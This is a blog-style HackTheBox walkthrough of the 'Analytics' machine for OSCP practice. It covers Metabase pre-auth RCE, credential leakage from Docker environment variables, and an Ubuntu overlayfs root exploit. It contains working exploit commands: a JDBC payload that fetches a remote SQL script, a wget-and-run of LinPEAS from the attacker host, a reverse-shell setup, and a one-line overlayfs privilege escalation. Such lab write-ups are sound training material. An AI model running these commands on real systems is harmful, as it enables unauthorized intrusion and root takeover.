+++
date = '2026-04-20T00:00:00-03:00'
draft = false
title = 'HTB: Analytics - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'rce', 'metabase', 'docker', 'kernel']
description = 'Write-up for the HackTheBox machine Analytics - part of my OSCP preparation journey following the Lain Kusanagi list.'
ShowToc = true
TocOpen = false

[cover]
image = 'images/htb-analytics/cover.png'
+++

Next up: **Analytics**, an Easy Linux box. Pre-auth RCE on Metabase, Docker escape via environment variable credential leak, and a kernel exploit chain for root.

## Machine info

| | |
|---|---|
| **Name** | Analytics |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Metabase 0.46.6 vulnerable to **pre-auth RCE** (CVE-2023-38646)
- Initial shell lands inside a Docker container
- Environment variables leak SSH credentials (`metalytics:An4lytics_ds20223#`)
- SSH to the host as `metalytics`, then kernel exploit **CVE-2023-2640 + CVE-2023-32629** (overlayfs) for root

---

## Recon

### RustScan + Nmap

```bash
rustscan -a 10.129.21.240 -- -sV -sC -Pn -A
```

![RustScan results](/images/htb-analytics/rustscan.png)

Open ports: **22** (SSH) and **80** (HTTP).

The login page redirects to `analytical.htb`, so I added it to `/etc/hosts`. Browsing the site reveals a landing page:

![Homepage](/images/htb-analytics/homepage.png)

The login link redirects to `data.analytical.htb` - added that to `/etc/hosts` as well.

```bash
echo "10.129.21.240 analytical.htb" >> /etc/hosts
echo "10.129.21.240 data.analytical.htb" >> /etc/hosts
```

---

## Enumeration

### Metabase login

Navigating to `data.analytical.htb` shows a **Metabase** login page:

![Metabase login](/images/htb-analytics/metabase-login.png)

Checking the `/api/session/properties` endpoint in the browser DevTools reveals the Metabase version - **0.46.6**:

![Metabase version](/images/htb-analytics/metabase-version.png)

### CVE-2023-38646

A quick `searchsploit` search confirmed an exploit exists:

![searchsploit results](/images/htb-analytics/searchsploit.png)

![searchsploit mirror](/images/htb-analytics/searchsploit-mirror.png)

**CVE-2023-38646** - Metabase 0.46.6 Pre-Auth Remote Code Execution. The vulnerability is in the `/api/setup/validate` endpoint, which tests database connections during setup but does not require authentication. It accepts arbitrary JDBC connection strings, and the H2 database driver can be abused to fetch and execute a remote SQL file containing OS commands.

The attack flow:

```
Attacker (no credentials)
        |
        v
POST /api/setup/validate
{ "details": { "db": "jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker/exploit.sql'" } }
        |
        v
Metabase server instantiates H2 JDBC driver
        |
        v
H2 driver fetches and executes exploit.sql
        |
        v
OS-level command execution as Metabase process user
```

---

## Foothold

### Metabase Pre-Auth RCE

```bash
python 51797.py -l 10.10.14.208 -p 443 -P 9999 -u http://data.analytical.htb
```

![Exploit RCE](/images/htb-analytics/exploit-rce.png)

RCE confirmed - running as `metabase`. Set up a more stable reverse shell:

![Reverse shell](/images/htb-analytics/shell-metabase.png)

### Docker container

Checking the root directory, `.dockerenv` confirms we're inside a Docker container:

![.dockerenv](/images/htb-analytics/dockerenv.png)

Found a `metabase.db` folder with some database files:

![metabase.db](/images/htb-analytics/metabase-db.png)

Analyzed the files but nothing interesting. Decided to run LinPEAS.

### LinPEAS inside the container

```bash
wget http://10.10.14.208/linpeas.sh -O l.sh
chmod +x l.sh && ./l.sh > out
```

![LinPEAS download](/images/htb-analytics/linpeas-download.png)

LinPEAS found **environment variables** with credentials:

![Environment variable credentials](/images/htb-analytics/env-creds.png)

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

### SSH to the host

These credentials work for SSH on the host machine:

![SSH as metalytics](/images/htb-analytics/ssh-metalytics.png)

We're out of the container and on the actual host as `metalytics`.

---

## Privilege Escalation

### Kernel version

Checking the OS version:

![OS release](/images/htb-analytics/os-release.png)

**Ubuntu 22.04.3 LTS (Jammy Jellyfish)** - this version is vulnerable to **CVE-2023-2640** and **CVE-2023-32629**.

### CVE-2023-2640 + CVE-2023-32629 - OverlayFS privilege escalation

These two CVEs chain together to exploit a flaw in Ubuntu's OverlayFS implementation:

- **CVE-2023-2640** - Ubuntu patched overlayfs to allow setting extended attributes (xattrs) on files, but failed to check whether the caller actually had the privileges those attributes imply. An unprivileged user inside a user namespace can stamp a file with `cap_setuid` capability.
- **CVE-2023-32629** - the overlayfs upper layer incorrectly inherits those attributes when the file is "copied up" from lower to upper layer, making them visible and honored outside the namespace, in the host context.

Chained together: create a user namespace, mount an overlayfs with a Python binary, set `cap_setuid` on it (unprivileged inside the namespace), exit the namespace, and the file now has `cap_setuid` honored by the host kernel. Call `os.setuid(0)` from that binary and you're root.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
```

![Root shell](/images/htb-analytics/root-shell.png)

**Root!**

---

## Takeaways (for OSCP)

- **Check API endpoints for version disclosure.** `/api/session/properties` leaked the exact Metabase version without authentication. Always probe API endpoints.
- **Docker containers leak secrets through environment variables.** When you land in a container, always check `env` or run LinPEAS - credentials are often passed as environment variables.
- **Container credentials often work on the host.** Password reuse between containerized services and the host OS is very common.
- **Kernel exploits are a last resort but sometimes the only path.** Check `cat /etc/os-release` and `uname -r` to identify kernel-level vulnerabilities. The overlayfs chain (CVE-2023-2640 + CVE-2023-32629) is specific to Ubuntu.

## References

- [HackTheBox - Analytics](https://app.hackthebox.com/machines/Analytics)
- [CVE-2023-38646 - Metabase Pre-Auth RCE](https://www.exploit-db.com/exploits/51797)
- [CVE-2023-2640 + CVE-2023-32629 - OverlayFS PoC](https://github.com/ThrynSec/CVE-2023-32629-CVE-2023-2640---POC-Escalation)
- Lain Kusanagi list (OSCP prep)
